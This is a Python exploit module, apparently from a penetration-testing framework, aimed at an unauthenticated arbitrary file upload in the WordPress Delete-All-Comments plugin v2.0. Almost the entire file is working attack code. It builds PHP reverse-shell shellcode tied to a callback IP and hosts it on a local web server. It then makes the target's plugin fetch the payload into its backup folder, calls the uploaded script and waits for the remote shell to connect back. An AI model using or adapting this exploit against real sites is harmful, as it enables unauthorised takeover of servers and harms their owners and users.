#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import time
import base64
import urllib
import urllib2
from collections import OrderedDict

sys.path.append('./core')
sys.path.append('./shellcodes')
import ShellUtils
import Shellcodes
from Sploit import Sploit
from WebHelper import SimpleWebServer

INFO = {}
INFO['NAME'] = "efa_wordpress_delete_all_comments_fu"
INFO['DESCRIPTION'] = "WordPress Delete-All-Comments plugin v2.0 - Arbitrary file upload"
INFO['VENDOR'] = "http://plugins.svn.wordpress.org/delete-all-comments/tags/2.0/"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://blog.nintechnet.com/arbitrary-file-upload-vulnerability-in-wordpress-delete-all-comments-plugin/']
INFO["CVE Name"] = "?"
INFO["NOTES"] = """Delete All Comments WordPress plugin v2.0, has over 30,000 active installations. Main script is not restricted to the administrator, any unauthenticated user can upload a remote PHP script into the /plugins/delete-all-comments/backup/ folder"""

INFO['CHANGELOG'] = "25 Jan, 2016. Written by Gleg team."
INFO['PATH'] = 'Exploits/Web/'

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = 80, dict(description = 'Target port')
OPTIONS["BASEPATH"] = '/wordpress', dict(description = 'Basepath')
OPTIONS["CALLBACK_IP"] = "127.0.0.1", dict(description = 'Callback IP')


class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.host = host
        self.port = port
        self.basepath = OPTIONS["BASEPATH"]
        self.callback_ip = ''
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.basepath = self.args.get('BASEPATH', self.basepath)
        self.callback_ip = self.args.get('CALLBACK_IP', OPTIONS["CALLBACK_IP"])
    
    def make_url(self, path = ''):
        return 'http://{}:{}{}{}'.format(self.host, self.port, self.basepath, path)
    
    def make_sploit(self):
        self.log("[>] Generate shellcode started")
        
        if self.args['listener']:
            port = self.args['listener']['PORT']
        else:
            return None

        s = Shellcodes.CrossOSShellcodes(self.callback_ip, port)
        shellcode = s.create_shellcode(ShellUtils.Constants.ShellcodeType.PHP, True)

        self.log("[>] Shellcode ready")
        return shellcode
    
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        if self.is_listener_connected() is None:
            self.log('Please, enable listener to use this module')
            self.finish(False)
        
        data = 'restorefromfileNAME=shellcode.php&restorefromfileURL=http://{}:8088/shellcode'.format(self.host)
        request = urllib2.Request(self.make_url('/wp-content/plugins/delete-all-comments/delete-all-comments.php'), data)
        
        server = SimpleWebServer(self.callback_ip, 8088)
        server.add_file_for_share("shellcode", self.make_sploit()[1:])
        server.start_serve()
        
        self.log('Uploading php shellcode')
        try:
            fd = urllib2.urlopen(request)
            self.log(fd.read())
        except Exception as e:
            self.log(e)
            self.finish(False)
        
        
        self.log('Execute shellcode.php and wait for callback connection')
        try:
            fd = urllib2.urlopen(self.make_url('/wp-content/plugins/delete-all-comments/backup/shellcode.php'))
        except Exception as e:
            self.log(e)
            self.finish(False)
        
        while True:
            if self.is_listener_connected():
                break
            time.sleep(3)
        
        server.stop_serve()
        self.finish(True)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
